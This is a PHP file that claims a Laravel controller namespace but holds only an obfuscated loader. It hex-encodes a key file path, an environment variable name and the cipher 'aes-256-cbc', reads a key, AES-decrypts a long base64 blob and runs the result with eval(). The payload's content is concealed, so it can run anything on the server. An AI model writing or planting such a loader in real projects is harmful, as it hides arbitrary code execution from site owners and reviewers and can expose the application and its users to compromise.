<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');
$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);
if(!$k)exit;
$i=base64_decode('SOWjsO6zEVberBllJ59ZLQ==');
$c=base64_decode(
'VrJTlAufIXMbK/Uv/lXRs1RmYCVStiiRTQyGjtuVnU6RRAr+ni8Vf4Cfz+cMU46IltG0FDLgnrg3' .
'0tN0FGOp9t9DIO3Fv8rhuW9/LFdpc7VtV8/i45Him6AnaMkamaO3gRl6R0IvguXMn7AOf5+J5aP7' .
'kt3knxyHOtRCvbDupcJfm3uM4fsKgeTRbbdXZxgnVgaeMP2ieDjIr3qTXv6rPDxGqYDcwQnH8FsI' .
'15f0MwJBTxZZJlzi1aSH6N++ZYBQ3tZqemX8QNK6CPm0t2/2umx+vflQm/u3ofKWbKePRLnqSON5' .
'Y0sGLFa26rgjrfHn4Sy1JcddkAv2Ucb3ZfE4qtjwksJvBPHMtrLujZqrB6aAonqV6c4KyGZ6zv2v' .
'myZsINdLdcL3IDw2QnZWe9EVZ5+498iorvdr9VcN2mmmkWv8EV4IsSwMYnMU/CUKl/pg6J4g6Rk4' .
'6V6n5TYJrX/MQUd73IiAM4pPcCDaJNAp9hPoSRyHbwUAS64C7/fiLaj+6S2po7sKWPIRhGQIr18U' .
'YbBolIfcpBlX7RLRC5/SjeC6J1Z3PqBY0E13yRFd5LIJPkpNvHImVlaxzC11xm27j4owk+P1CwvJ' .
'gSRRx8RGyJPfvM3rCzxVUPIlkt59k3JOGQ5Dlnkr7IQhayaT9uJ5Plhv0V8LP3/M2fxDKj9oKByt' .
'VWHssNFvTU7vzIg2XR6I1pzKpSlKzF9nJq++1OtqYjNM39uXXWAcNlpLyaC3LHAIz8JvfhF1k7EB' .
'aRjTWouJ6HDyIc67hqlNu5dqBO2BDponx0SUPkRI965aPTAzIrOBDClt5EyKLFFw3pHjKWLpfIFG' .
'pJJJqBgO41QaKehfnkfwd/dmWLJkVTBXnI45k/tGit/yE62HMXXqEwTlB+u7euUbfj0PIvhoRLdU' .
'MZ0IOfPo/hrCcAkRjywHwByA/tTIMM8gHJv4+Igdi0zlfcnpfC9D30HwEnDH3+3r2KiXxwtNz0q5' .
'13iQ3/MGRW70ugfXenTsQCE9hkDyrJU71koKIhojOF6c1JuWMrJ3QycjWMAbdEBJTOo7cerAO8RY' .
'cuQjIfRMtiO63Hv9Mk4ySzntQmggaM5CI/x5fdpagoJ30zNaS9yMNDniCQ4TPyJCdc3cRO69dMw2' .
'JyvS+TZ/lGfIoxPuXCqUF7tJupsCzz68XV0uBKHFLcfoPk4/KWygqrEk36RFXrh+1ntq7+QxNnp5' .
'zEL4b4LbTtxZ3zutrf0Gpz7UH+7R4mstREhJDZa/yxNkniTYwn9J486x8HblQ1/584BZ1ra6d2CD' .
'3nooLVTWOLqIxlo/AbbLa/ch+vfMXjsnj9fXfuAFi/03mBDO46m8h+Xr+F+qK0Q8PAIs3WR0iPc1' .
'Uy7eZ7fq+hpP0/p4fYMnL99+w5xxDuf8rTd3pTKUBZnXQ+JQggfCoa8SWRsd1cKf0NFHyhZVuc5B' .
'UcUl0Yho5pHGoXXznzCurhNxe/QbSDMUn8SBCvqkFIUNx9zc8e+kpyuj8CxpAmnwejzLFlwFWEJ/' .
'QdaUYXz/x1dVkRPSZvQknume/1KdjEVkmKqtp41j+uedQ4IpDhGkA9U1XnZNgXFQy2wksUOWzJDv' .
'B+C1peYTpGD5zPphlRSa2yLedwmO+lOQqIyEUgwt4pc1zX7NsfogJOibtoOb77RNUYGMouK2SiJB' .
'XZ0KuyDfN6vdu7SwCtFyK7aheTyTry+br8I='
);
$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);
if($d===false)exit;
eval($d);
